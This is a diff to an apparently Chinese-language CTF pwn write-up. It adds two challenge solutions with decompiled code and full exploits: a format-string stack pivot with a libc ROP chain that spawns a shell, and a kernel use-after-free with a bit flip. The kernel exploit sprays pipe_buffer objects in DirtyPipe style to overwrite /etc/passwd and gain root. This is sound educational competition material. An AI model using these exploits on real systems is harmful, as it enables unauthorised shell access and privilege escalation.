@@ -12,9 +12,11 @@ tags:
     - 跳转表漏洞
     - 堆溢出
     - tcache poisoning
+    - 堆喷射
+    - kernel
+    - 格式化字符串
 categories: Contest
 ---
-
 ## heap_master
 
 ### checksec
@@ -474,4 +476,289 @@ itr()
 # 0x000000000011f2e7: pop rdx; pop r12; ret;
 # 0x0000000000091316: syscall; ret; 
 
+```
+
+## fmt
+
+### checksec
+
+```
+[*] '/home/RatherHard/CTF-pwn/dlutctf2025/fmt/fmt'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+应该是很简单的栈
+
+### IDA
+
+#### main
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  setbuf(stdin, 0);
+  setbuf(stdout, 0);
+  setbuf(stderr, 0);
+  puts("you have one chance .");
+  read(0, &buf, 0x100u);
+  func1((__int64)&buf);
+  return 0;
+}
+```
+
+#### func1
+
+```c
+int __fastcall func1(const char *a1)
+{
+  return func2(a1);
+}
+```
+
+#### func2
+
+```c
+int __fastcall func2(const char *a1)
+{
+  int result; // eax
+
+  result = flag;
+  if ( flag == 1 )
+  {
+    result = printf(a1);
+    flag = 0;
+  }
+  return result;
+}
+```
+
+### 攻击思路
+
+格式化字符串打栈， func 套了两层，那么栈迁移一下就行啦
+
+尝试用了 pwntools 的神奇 rop 工具，挺好用的
+
+有时间打算去看看 pwncli
+
+### exp
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+context.arch = 'amd64'
+context.os = 'linux'
+context.terminal = ['tmux', 'splitw', '-h']
+
+debug = 1
+
+file = './fmt_patched'
+elf = ELF(file)
+libc = ELF('./libc.so.6')
+
+target = '60.205.163.215'
+port = 13774
+
+if debug:
+    p = process(file)
+else:
+    p = remote(target, port)
+
+io = p
+
+def dbg(cmd = ''):
+    if debug:
+        gdb.attach(p, gdbscript = cmd)
+
+s       = lambda data           :p.send(data)
+sl      = lambda data           :p.sendline(data)
+sa      = lambda x, data        :p.sendafter(x, data)
+sla     = lambda x, data        :p.sendlineafter(x, data)
+r       = lambda num=4096       :p.recv(num)
+rl      = lambda num=4096       :p.recvline(num)
+ru      = lambda x              :p.recvuntil(x)
+itr     = lambda                :p.interactive()
+uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
+uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
+uru64   = lambda                :uu64(ru('\x7f')[-6:])
+leak    = lambda name           :log.success(name + ' = ' + hex(eval(name)))
+
+fake_stack = 0x4040a0 + 0x80
+back = 0x401252
+payload = b'%' + str(fake_stack - 0x8).encode() + b'c%8$ln;%3$p'
+payload = payload.ljust(0x80, b'\x00')
+payload += p64(back)
+sa(b'chance .', payload)
+ru(b';0x')
+libc.address = int(r(12).decode('utf-8'), 16) - 0x1147e2
+leak('libc.address')
+
+bin_sh = next(libc.search(b'/bin/sh'))
+chain = ROP(libc)
+chain.execve(bin_sh, 0, 0)
+payload = b'A' * 0x80 + chain.chain()
+
+s(payload)
+itr()
+```
+
+## ker
+
+第一道内核题
+
+### IDA
+
+#### ioctl
+
+```c
+__int64 __fastcall module_ioctl(file *__file, __int64 cmd, unsigned __int64 param)
+{
+  unsigned int v3; // edx
+  unsigned int v4; // r12d
+  __int64 v5; // rbx
+  _QWORD *v7; // rax
+
+  _fentry__();
+  v4 = v3;
+  raw_spin_lock(&spin);
+  switch ( (_DWORD)cmd )
+  {
+    case 0xFFFF:
+      kfree(buffer);
+      buffer = 0;
+      break;
+    case 0xDEADBEEF:
+      if ( v4 <= 0x400 )
+        *((_BYTE *)buffer + (v4 >> 3)) ^= 1 << (v4 & 7);
+      break;
+    case 0x1000:
+      v7 = buffer;
+      if ( !buffer )
+      {
+        v7 = (_QWORD *)kmalloc_trace(kmalloc_caches[262], 0x400CC0, 1024);
+        buffer = v7;
+        if ( !v7 )
+        {
+          v5 = -1;
+          goto LABEL_5;
+        }
+      }
+      *v7 = 0;
+      v7[127] = 0;
+      memset(
+        (void *)((unsigned __int64)(v7 + 1) & 0xFFFFFFFFFFFFFFF8LL),
+        0,
+        8LL * (((unsigned int)v7 - (((_DWORD)v7 + 8) & 0xFFFFFFF8) + 1024) >> 3));
+      break;
+  }
+  v5 = 0;
+LABEL_5:
+  raw_spin_unlock(&spin);
+  return v5;
+}
+```
+
+有位翻转
+
+#### open
+
+```c
+__int64 __fastcall module_open(inode *__inode, file *__file)
+{
+  _fentry__();
+  raw_spin_lock(&spin);
+  if ( buffer )
+    goto LABEL_2;
+  buffer = (void *)kmalloc_trace(kmalloc_caches[262], 0x400CC0, 1024);
+  if ( buffer )
+  {
+    memset(buffer, 0, 0x400u);
+LABEL_2:
+    raw_spin_unlock(&spin);
+    return 0;
+  }
+  return 0xFFFFFFFFLL;
+}
+```
+
+打开设备时往全局变量 buffer 上写入指向堆区的指针，但如果 buffer 非空则不做操作
+
+#### release
+
+```c
+__int64 __fastcall module_release(inode *__inode, file *__file)
+{
+  _fentry__();
+  raw_spin_lock(&spin);
+  if ( buffer )
+    kfree(buffer);
+  raw_spin_unlock(&spin);
+  return 0;
+}
+```
+
+close 时会 free ，结合上面的 open 产生了 UAF
+
+### 攻击思路
+
+听学长的建议去了解了一下 DirtyPipe
+
+发现这题用 DirtyPipe 很好打，甚至不用做 rop 或者绕各种保护
+
+有了 UAF 就把 pipe_buffer 喷上去，然后用位翻转改 flag 就能去写任意文件了
+
+然后去改 /etc/passwd 的 root 密码， su 一下就能提权
+
+有空会去复现一下相关 CVE
+
+### 经验总结
+
+这道题只申请一个 pipe_buffer 可能命中不了，所以需要多申请几个，这就是堆喷射: Heap Spray
+
+fd 被 close 后就没了，想用 ioctl 的话需要再次 open
+
+### exp
+
+```c
+#include "kernelpwn.h"
+
+#define CMD_CLEAN 0xFFFF
+#define CMD_ALLOC 0x1000
+#define CMD_EDIT  0xDEADBEEF
+
+int spraycount = 50;
+
+int main() {
+    printf("Enter spraycount:");
+    scanf("%d", &spraycount);
+    bind_core(0);
+
+    int file_fd = open("/etc/passwd", O_RDONLY);
+    
+    int fd = open("/dev/kernel_master", O_RDWR);
+    close(fd);
+
+    int pipe_fds[spraycount][2];
+    for (int i = 0; i < spraycount; i++) {
+        pipe(pipe_fds[i]);
+        splice(file_fd, NULL, pipe_fds[i][1], NULL, 1, SPLICE_F_MOVE);
+    }
+
+    int fd2 = open("/dev/kernel_master", O_RDWR);
+    ioctl(fd2, CMD_EDIT, (24 << 3) + 4);
+
+    const char *data = "oot::0:0:root:/root:/bin/sh\n";
+    for (int i = 0; i < spraycount; i++) {
+        write(pipe_fds[i][1], data, strlen(data));
+    }
+
+    return 0;
+}
 ```
